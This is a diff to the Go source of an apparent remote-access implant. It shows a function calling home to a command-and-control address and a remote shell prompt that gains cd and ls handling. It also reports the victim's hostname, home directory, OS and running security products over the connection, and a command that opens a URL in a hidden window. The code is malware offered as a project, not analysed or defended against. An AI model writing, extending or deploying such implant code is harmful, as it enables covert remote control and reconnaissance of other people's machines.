@@ -28,7 +28,7 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 		time.Sleep(10 * time.Second)
 		return addr, false
 	}
-	addr.Write([]byte("Success\n"))
+	addr.Write([]byte("\nSuccess\n\n"))
 	*attempts = 0
 	return addr, true
 }
@@ -143,10 +143,9 @@ func ls(conn *net.Conn, implantWD *string) {
 		dirInfo, _ := dirFS[e].Info()
 		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
 	}
-	//Try to combine them into 1 TCP messages instead
-	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n"))
-	(*conn).Write([]byte("		----		" + "----		" + "	----" + "\n"))
-	(*conn).Write([]byte(dirListing + "\n"))
+	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
+		"		----		" + "----		" + "	----" + "\n" +
+		dirListing + "\n")) //Looks funky but I want it organized
 }
 
 func main() {
@@ -172,6 +171,13 @@ func main() {
 				for {
 					conn.Write([]byte("PS > "))
 					command = listen4Commands(&conn)
+					if cd(&conn, &command, &implantWD) {
+						continue
+					}
+					if command == "ls\n" {
+						ls(&conn, &implantWD)
+						continue
+					}
 					if command == "bg\n" {
 						break
 					}
@@ -182,15 +188,14 @@ func main() {
 			{
 				hostname, _ := os.Hostname()
 				home, _ := os.UserHomeDir()
-				OperatingSystem := runtime.GOOS
 				products := checkSec()
-				conn.Write([]byte("\n" + "Hostname: " + hostname + "\n" + "User Dir: " + home + "\n" + "OS: " + OperatingSystem + "\n"))
+				conn.Write([]byte("\n" + "Hostname: " + hostname + "\n" + "User Dir: " + home + "\n" + "OS: " + runtime.GOOS + "\n"))
 				productStr := ""
 				for i := range products {
 					productStr = productStr + products[i] + " "
 				}
 				if len(products) < 1 {
-					products[0] = "No Security Products Present\n"
+					products[0] = "No Security Products Running\n\n"
 				}
 				conn.Write([]byte("Security: " + productStr + "\n\n"))
 			}
@@ -219,8 +224,7 @@ func main() {
 		case "rickroll\n": //I luv it
 			{
 				cmd := exec.Command("cmd", "/C", "start", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-				//cmd := exec.Command("start", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 				cmd.Run()
 			}
 		case "pwd\n":
